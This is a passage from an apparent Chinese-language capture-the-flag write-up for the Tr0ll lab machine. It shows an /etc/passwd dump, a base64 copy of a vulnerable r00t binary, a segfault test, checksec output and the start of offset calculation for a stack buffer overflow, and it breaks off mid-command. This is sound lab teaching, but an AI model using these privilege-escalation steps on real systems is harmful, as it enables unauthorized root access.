class=\"hljs-operator\">/</span>sh\nwww<span class=\"hljs-operator\">-</span>data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www<span class=\"hljs-operator\">-</span>data:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>backups:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlist:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing List Manager:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>list:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>run<span class=\"hljs-operator\">/</span>ircd:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug<span class=\"hljs-operator\">-</span>Reporting <span class=\"hljs-keyword\">System</span> (admin):<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>gnats:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:<span class=\"hljs-operator\">/</span>nonexistent:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlibuuid:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">101</span>::<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>libuuid:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nsyslog:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">103</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>syslog:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nmessagebus:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">104</span>::<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>run<span class=\"hljs-operator\">/</span>dbus:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nmaleus:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:Tr0ll,,,:<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>maleus:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nsshd:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">65534</span>::<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>run<span class=\"hljs-operator\">/</span>sshd:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin<span class=\"hljs-operator\">/</span>nologin\nftp:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">111</span>:ftp daemon,,,:<span class=\"hljs-operator\">/</span>srv<span class=\"hljs-operator\">/</span>ftp:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\nnoob:x:<span class=\"hljs-number\">1002</span>:<span class=\"hljs-number\">1002</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>noob:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\nTr0ll:x:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">1001</span>::<span class=\"hljs-operator\">/</span>home<span class=\"hljs-operator\">/</span>tr0ll:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-literal\">false</span>\n....\n</code></pre>\n<p>没找到什么可以提权</p>\n</li>\n<li>\n<p>看着目录</p>\n<pre><code class=\"hljs language-python\">/nothing_to_see_here/choose_wisely/door2/r00t\n/nothing_to_see_here/choose_wisely/door3/r00t\n/nothing_to_see_here/choose_wisely/door1/r00t\n</code></pre>\n<p>有点怪怪的，并且拥有sudo权限</p>\n<pre><code class=\"hljs language-python\">$ ./r00t\n./r00t\nUsage: ./r00t <span class=\"hljs-built_in\">input</span>\n</code></pre>\n<p>让我们输入字符，我们判断是否存在缓冲区溢出漏洞</p>\n</li>\n</ol>\n<h2>验证缓冲区溢出漏洞</h2>\n<ol>\n<li>\n<p>输入 300个A尝试</p>\n<pre><code class=\"hljs language-python\">$ ./r00t $(python -c <span class=\"hljs-string\">\"print 'A'*300\"</span>)\n./r00t $(python -c <span class=\"hljs-string\">\"print 'A'*300\"</span>)\nSegmentation fault\n</code></pre>\n<p><code>Segmentation fault</code> 发现缓冲区溢出漏洞（出现这个错误要立马进行base64编码，其他两个文件夹也有别的r00t文件，是恶搞的，会一段时间随机交换）</p>\n</li>\n<li>\n<p>将文件传到本地进行测试</p>\n<pre><code class=\"hljs language-python\">base64 r00t\n//\nf0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAkIMECDQAAACEFAAAAAAAADQAIAAJACgAJAAhAAYAAAA0\nAAAANIAECDSABAggAQAAIAEAAAUAAAAEAAAAAwAAAFQBAABUgQQIVIEECBMAAAATAAAABAAAAAEA\nAAABAAAAAAAAAACABAgAgAQIjAYAAIwGAAAFAAAAABAAAAEAAAAUDwAAFJ8ECBSfBAgIAQAAEAEA\nAAYAAAAAEAAAAgAAACgPAAAonwQIKJ8ECMgAAADIAAAABgAAAAQAAAAEAAAAaAEAAGiBBAhogQQI\nRAAAAEQAAAAEAAAABAAAAFDldGSUBQAAlIUECJSFBAg0AAAANAAAAAQAAAAEAAAAUeV0ZAAAAAAA\nAAAAAAAAAAAAAAAAAAAABwAAAAQAAABS5XRkFA8AABSfBAgUnwQI7AAAAOwAAAAEAAAAAQAAAC9s\naWIvbGQtbGludXguc28uMgAABAAAABAAAAABAAAAR05VAAAAAAACAAAABgAAABgAAAAEAAAAFAAA\nAAMAAABHTlUAxUaFQ7rUdw8bxODDYM2LTwZAnIkCAAAABgAAAAEAAAAFAAAAACAAIAAAAAAGAAAA\nrUvjwAAAAAAAAAAAAAAAAAAAAAA1AAAAAAAAAAAAAAASAAAAKQAAAAAAAAAAAAAAEgAAAAEAAAAA\nAAAAAAAAACAAAAAwAAAAAAAAAAAAAAASAAAAPAAAAAAAAAAAAAAAEgAAABoAAAB8hQQIBAAAABEA\nDwAAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AF9JT19zdGRpbl91c2VkAHN0cmNweQBleGl0AHBy\naW50ZgBfX2xpYmNfc3RhcnRfbWFpbgBHTElCQ18yLjAAAAACAAIAAAACAAIAAQAAAAEAAQAQAAAA\nEAAAAAAAAAAQaWkNAAACAE4AAAAAAAAA8J8ECAYDAAAAoAQIBwEAAASgBAgHAgAACKAECAcDAAAM\noAQIBwQAABCgBAgHBQAAU4PsCOgAAAAAW4HD9xwAAIuD/P///4XAdAXoTQAAAOgIAQAA6BMCAACD\nxAhbwwAAAAAAAAAAAAAAAAAA/zX4nwQI/yX8nwQIAAAAAP8lAKAECGgAAAAA6eD/////JQSgBAho\nCAAAAOnQ/////yUIoAQIaBAAAADpwP////8lDKAECGgYAAAA6bD/////JRCgBAhoIAAAAOmg////\nMe1eieGD5PBQVFJoIIUECGiwhAQIUVZoRIQECOjP////9JCQkJCQkJCQkJCQkJCQVYnlU4PsBIA9\nHKAECAB1P6EgoAQIuyCfBAiB6xyfBAjB+wKD6wE52HMejbYAAAAAg8ABoyCgBAj/FIUcnwQIoSCg\nBAg52HLoxgUcoAQIAYPEBFtdw410JgCNvCcAAAAAVYnlg+wYoSSfBAiFwHQSuAAAAACFwHQJxwQk\nJJ8ECP/QycOQVYnlg+TwgewQAQAAg30IAXUii0UMixC4gIUECIlUJASJBCTo1P7//8cEJAAAAADo\n+P7//4tFDIPABIsAiUQkBI1EJBCJBCTowP7//7iRhQQIjVQkEIlUJASJBCTom/<span class=\"hljs-number\">7</span>//8nDkJCQkJCQ\nkJCQVVdWU+hpAAAAgcM7GwAAg+wci2wkMI27IP///+gj/v//jYMg////KcfB/wKF/3QpMfaNtgAA\nAACLRCQ4iSwkiUQkCItEJDSJRCQE/5SzIP///4PGATn+dd+DxBxbXl9dw+sNkJCQkJCQkJCQkJCQ\nkPPDixwkw5CQkJCQkJCQkJBVieVTg+wEoRSfBAiD+P90E7sUnwQIZpCD6wT/0IsDg/j/dfSDxARb\nXcOQkFOD7AjoAAAAAFuBw48aAADoT/<span class=\"hljs-number\">7</span>//4PECFvDAAADAAAAAQACAFVzYWdlOiAlcyBpbnB1dAoA\nJXMAARsDOzAAAAAFAAAAnP3//0wAAACw/v//cAAAABz///+QAAAAjP///8wAAACO////4AAAABQA\nAAAAAAAAAXpSAAF8CAEbDAQEiAEAACAAAAAcAAAASP3//2AAAAAADghGDgxKDwt0BHgAPxo7KjIk\nIhwAAABAAAAAOP7//2MAAAAAQQ4IhQJCDQUCX8UMBAQAOAAAAGAAAACE/v//YQAAAABBDgiFAkEO\nDIcDQQ4QhgRBDhSDBU4OMAJKDhRBDhDDQQ4MxkEOCMdBDgTFEAAAAJwAAAC4/v//AgAAAAAAAAAQ\nAAAAsAAAAKb+//8EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAP////8AAAAA\nAAAAAAEAAAAQAAAADAAAAPSCBAgNAAAAXIUECPX+/<span class=\"hljs-number\">2</span>+sgQQIBQAAADyCBAgGAAAAzIEECAoAAABY\nAAAACwAAABAAAAAVAAAAAAAAAAMAAAD0nwQIAgAAACgAAAAUAAAAEQAAABcAAADMggQIEQAAAMSC\nBAgSAAAACAAAABMAAAAIAAAA/v//b6SCBAj///9vAQAAAPD//<span class=\"hljs-number\">2</span>+UggQIAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACifBAgAAAAAAAAAAEaDBAhWgwQI\nZoMECHaDBAiGgwQIAAAAAAAAAABHQ0M6IChVYnVudHUvTGluYXJvIDQuNi4zLTF1YnVudHU1KSA0\nLjYuMwAcAAAAAgAAAAAABAAAAAAARIQECGMAAAAAAAAAAAAAABEBAAACAAAAAAAEAUoAAAABcwAA\nAD8AAABEhAQIp4QECAAAAAACBAcfAAAAAgEILAAAAAICB1sAAAACBAcaAAAAAgEGLgAAAAICBXkA\nAAADBAVpbnQAAggFAAAAAAIIBxUAAAACBAUFAAAABARxAAAAAgEGNQAAAAQEfgAAAAVxAAAABgE6\nAAAAAQMBTwAAAESEBAinhAQIAAAAAAIBAAAHVgAAAAEDTwAAAAKRAAeDAAAAAQMCAQAAApEECGJ1\nZgABBQgBAAACdBAJAQ4AAAACAAFrAAAAAecAAAAKawAAAAp4AAAAAAtWhAQIeIQECAwBbgAAAAIA\nAQEKTwAAAAAAAAQEawAAAA1xAAAADiUAAAD/AAABEQElDhMLAw4bDhEBEgEQBgAAAiQACws+CwMO\nAAADJAALCz4LAwgAAAQPAAsLSRMAAAUmAEkTAAAGLgE/DAMOOgs7CycMSRMRARIBQAYBEwAABwUA\nAw46CzsLSRMCCgAACDQAAwg6CzsLSRMCCgAACS4BPwwDDjoLOwsnDEkTPAwBEwAACgUASRMAAAsL\nAREBEgEAAAwuAT8MAw46CzsLJww8DAAADQEBSRMAAA4hAEkTLwsAAABGAAAAAgAqAAAAAQH7Dg0A\nAQEBAQAAAAEAAAEAYm9mLmMAAAAAPGJ1aWx0LWluPgAAAAAAAAUCRIQECBS+aAhZvgh1CEsCAgAB\nAWxvbmcgbG9uZyBpbnQAc3RyY3B5AGxvbmcgbG9uZyB1bnNpZ25lZCBpbnQAdW5zaWduZWQgY2hh\ncgBtYWluAC9ob21lL25vb2IAR05VIEMgNC42LjMAYXJnYwBzaG9ydCB1bnNpZ25lZCBpbnQAZXhp\ndABib2YuYwBzaG9ydCBpbnQAYXJndgAAAAAAAQAAAAIAdAQBAAAAAwAAAAIAdAgDAAAAYgAAAAIA\ndQhiAAAAYwAAAAIAdAQAAAAAAAAAAAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAA\nLm5vdGUuQUJJLXRhZwAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0\ncgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbC5keW4ALnJlbC5wbHQALmluaXQALnRl\neHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuY3RvcnMALmR0b3JzAC5q\nY3IALmR5bmFtaWMALmdvdAAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AC5kZWJ1Z19hcmFu\nZ2VzAC5kZWJ1Z19pbmZvAC5kZWJ1Z19hYmJyZXYALmRlYnVnX2xpbmUALmRlYnVnX3N0cgAuZGVi\ndWdfbG9jAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAEAAAAC\nAAAAVIEECFQBAAATAAAAAAAAAAAAAAABAAAAAAAAACMAAAAHAAAAAgAAAGiBBAhoAQAAIAAAAAAA\nAAAAAAAABAAAAAAAAAAxAAAABwAAAAIAAACIgQQIiAEAACQAAAAAAAAAAAAAAAQAAAAAAAAARAAA\nAPb//28CAAAArIEECKwBAAAgAAAABQAAAAAAAAAEAAAABAAAAE4AAAALAAAAAgAAAMyBBAjMAQAA\ncAAAAAYAAAABAAAABAAAABAAAABWAAAAAwAAAAIAAAA8ggQIPAIAAFgAAAAAAAAAAAAAAAEAAAAA\nAAAAXgAAAP///28CAAAAlIIECJQCAAAOAAAABQAAAAAAAAACAAAAAgAAAGsAAAD+//9vAgAAAKSC\nBAikAgAAIAAAAAYAAAABAAAABAAAAAAAAAB6AAAACQAAAAIAAADEggQIxAIAAAgAAAAFAAAAAAAA\nAAQAAAAIAAAAgwAAAAkAAAACAAAAzIIECMwCAAAoAAAABQAAAAwAAAAEAAAACAAAAIwAAAABAAAA\nBgAAAPSCBAj0AgAALgAAAAAAAAAAAAAABAAAAAAAAACHAAAAAQAAAAYAAAAwgwQIMAMAAGAAAAAA\nAAAAAAAAABAAAAAEAAAAkgAAAAEAAAAGAAAAkIMECJADAADMAQAAAAAAAAAAAAAQAAAAAAAAAJgA\nAAABAAAABgAAAFyFBAhcBQAAGgAAAAAAAAAAAAAABAAAAAAAAACeAAAAAQAAAAIAAAB4hQQIeAUA\nABwAAAAAAAAAAAAAAAQAAAAAAAAApgAAAAEAAAACAAAAlIUECJQFAAA0AAAAAAAAAAAAAAAEAAAA\nAAAAALQAAAABAAAAAgAAAMiFBAjIBQAAxAAAAAAAAAAAAAAABAAAAAAAAAC+AAAAAQAAAAMAAAAU\nnwQIFA8AAAgAAAAAAAAAAAAAAAQAAAAAAAAAxQAAAAEAAAADAAAAHJ8ECBwPAAAIAAAAAAAAAAAA\nAAAEAAAAAAAAAMwAAAABAAAAAwAAACSfBAgkDwAABAAAAAAAAAAAAAAABAAAAAAAAADRAAAABgAA\nAAMAAAAonwQIKA8AAMgAAAAGAAAAAAAAAAQAAAAIAAAA2gAAAAEAAAADAAAA8J8ECPAPAAAEAAAA\nAAAAAAAAAAAEAAAABAAAAN8AAAABAAAAAwAAAPSfBAj0DwAAIAAAAAAAAAAAAAAABAAAAAQAAADo\nAAAAAQAAAAMAAAAUoAQIFBAAAAgAAAAAAAAAAAAAAAQAAAAAAAAA7gAAAAgAAAADAAAAHKAECBwQ\nAAAIAAAAAAAAAAAAAAAEAAAAAAAAAPMAAAABAAAAMAAAAAAAAAAcEAAAKgAAAAAAAAAAAAAAAQAA\nAAEAAAD8AAAAAQAAAAAAAAAAAAAARhAAACAAAAAAAAAAAAAAAAEAAAAAAAAACwEAAAEAAAAAAAAA\nAAAAAGYQAAAVAQAAAAAAAAAAAAABAAAAAAAAABcBAAABAAAAAAAAAAAAAAB7EQAAtwAAAAAAAAAA\nAAAAAQAAAAAAAAAlAQAAAQAAAAAAAAAAAAAAMhIAAEoAAAAAAAAAAAAAAAEAAAAAAAAAMQEAAAEA\nAAAwAAAAAAAAAHwSAACIAAAAAAAAAAAAAAABAAAAAQAAADwBAAABAAAAAAAAAAAAAAAEEwAAOAAA\nAAAAAAAAAAAAAQAAAAAAAAARAAAAAwAAAAAAAAAAAAAAPBMAAEcBAAAAAAAAAAAAAAEAAAAAAAAA\nAQAAAAIAAAAAAAAAAAAAACQaAACQBAAAIwAAADMAAAAEAAAAEAAAAAkAAAADAAAAAAAAAAAAAAC0\nHgAAHQIAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFSBBAgAAAAAAwABAAAA\nAABogQQIAAAAAAMAAgAAAAAAiIEECAAAAAADAAMAAAAAAKyBBAgAAAAAAwAEAAAAAADMgQQIAAAA\nAAMABQAAAAAAPIIECAAAAAADAAYAAAAAAJSCBAgAAAAAAwAHAAAAAACkggQIAAAAAAMACAAAAAAA\nxIIECAAAAAADAAkAAAAAAMyCBAgAAAAAAwAKAAAAAAD0ggQIAAAAAAMACwAAAAAAMIMECAAAAAAD\nAAwAAAAAAJCDBAgAAAAAAwANAAAAAABchQQIAAAAAAMADgAAAAAAeIUECAAAAAADAA8AAAAAAJSF\nBAgAAAAAAwAQAAAAAADIhQQIAAAAAAMAEQAAAAAAFJ8ECAAAAAADABIAAAAAAByfBAgAAAAAAwAT\nAAAAAAAknwQIAAAAAAMAFAAAAAAAKJ8ECAAAAAADABUAAAAAAPCfBAgAAAAAAwAWAAAAAAD0nwQI\nAAAAAAMAFwAAAAAAFKAECAAAAAADABgAAAAAABygBAgAAAAAAwAZAAAAAAAAAAAAAAAAAAMAGgAA\nAAAAAAAAAAAAAAADABsAAAAAAAAAAAAAAAAAAwAcAAAAAAAAAAAAAAAAAAMAHQAAAAAAAAAAAAAA\nAAADAB4AAAAAAAAAAAAAAAAAAwAfAAAAAAAAAAAAAAAAAAMAIAABAAAAAAAAAAAAAAAEAPH/DAAA\nABSfBAgAAAAAAQASABoAAAAcnwQIAAAAAAEAEwAoAAAAJJ8ECAAAAAABABQANQAAAMCDBAgAAAAA\nAgANAEsAAAAcoAQIAQAAAAEAGQBaAAAAIKAECAQAAAABABkAaAAAACCEBAgAAAAAAgANAAEAAAAA\nAAAAAAAAAAQA8f90AAAAGJ8ECAAAAAABABIAgQAAAIiGBAgAAAAAAQARAI8AAAAknwQIAAAAAAEA\nFACbAAAAMIUECAAAAAACAA0AsQAAAAAAAAAAAAAABADx/7cAAAAUnwQIAAAAAAAAEgDIAAAAKJ8E\nCAAAAAABABUA0QAAABSfBAgAAAAAAAASAOQAAAD0nwQIAAAAAAEAFwD6AAAAIIUECAIAAAASAA0A\nCgEAACKFBAgAAAAAEgINACEBAAAUoAQIAAAAACAAGAAsAQAAAAAAAAAAAAASAAAAPgEAABygBAgA\nAAAAEADx/0UBAABchQQIAAAAABIADgBLAQAAAAAAAAAAAAASAAAAXQEAACCfBAgAAAAAEQITAGoB\nAAAUoAQIAAAAABAAGAB3AQAAAAAAAAAAAAAgAAAAhgEAAAAAAAAAAAAAEgAAAJYBAAAYoAQIAAAA\nABECGACjAQAAfIUECAQAAAARAA8AsgEAAAAAAAAAAAAAEgAAAM8BAACwhAQIYQAAABIADQDfAQAA\nJKAECAAAAAAQAPH/5AEAAJCDBAgAAAAAEgANAOsBAAB4hQQIBAAAABEADwDyAQAAHKAECAAAAAAQ\nAPH//gEAAESEBAhjAAAAEgANAAMCAAAAAAAAAAAAACAAAAAXAgAA9IIECAAAAAASAAsAAGNydHN0\ndWZmLmMAX19DVE9SX0xJU1RfXwBfX0RUT1JfTElTVF9fAF9fSkNSX0xJU1RfXwBfX2RvX2dsb2Jh\nbF9kdG9yc19hdXgAY29tcGxldGVkLjYxNTkAZHRvcl9pZHguNjE2MQBmcmFtZV9kdW1teQBfX0NU\nT1JfRU5EX18AX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2RvX2dsb2JhbF9jdG9yc19hdXgA\nYm9mLmMAX19pbml0X2FycmF5X2VuZABfRFlOQU1JQwBfX2luaXRfYXJyYXlfc3RhcnQAX0dMT0JB\nTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AGRh\ndGFfc3RhcnQAcHJpbnRmQEBHTElCQ18yLjAAX2VkYXRhAF9maW5pAHN0cmNweUBAR0xJQkNfMi4w\nAF9fRFRPUl9FTkRfXwBfX2RhdGFfc3RhcnQAX19nbW9uX3N0YXJ0X18AZXhpdEBAR0xJQkNfMi4w\nAF9fZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4w\nAF9fbGliY19jc3VfaW5pdABfZW5kAF9zdGFydABfZnBfaHcAX19ic3Nfc3RhcnQAbWFpbgBfSnZf\nUmVnaXN0ZXJDbGFzc2VzAF9pbml0AA=\n</code></pre>\n<p>然后复制到本地命名为<code>base64.txt</code></p>\n<p>base64解码</p>\n<pre><code class=\"hljs language-python\">base64 base64.txt -d > r00t\n</code></pre>\n<p>然后生成md5和靶机的md5对比，一模一样</p>\n<pre><code class=\"hljs language-python\">0e1049b1040b0598a364f33de29cc2a7  r00t\n</code></pre>\n</li>\n</ol>\n<h2>缓冲区溢出漏洞利用</h2>\n<ol>\n<li>\n<p>checksec查看保护机制，没有保护</p>\n<pre><code class=\"hljs language-python\">gdb-peda$ checksec r00t\nCANARY    : disabled\nFORTIFY   : disabled\nNX        : disabled\nPIE       : disabled\nRELRO     : Partial\n</code></pre>\n</li>\n<li>\n<p>计算偏移量</p>\n<p>使用pattern生成不重复字符串（用的是msf的，gdb自带的会产生括号）</p>\n<pre><code class=\"hljs language-python\">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span class=\"hljs-number\">300</span>\n//\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\n</code></pre>\n<p>放到程序里</p>\n<pre><code class=\"hljs language-python\">gdb-peda$ r 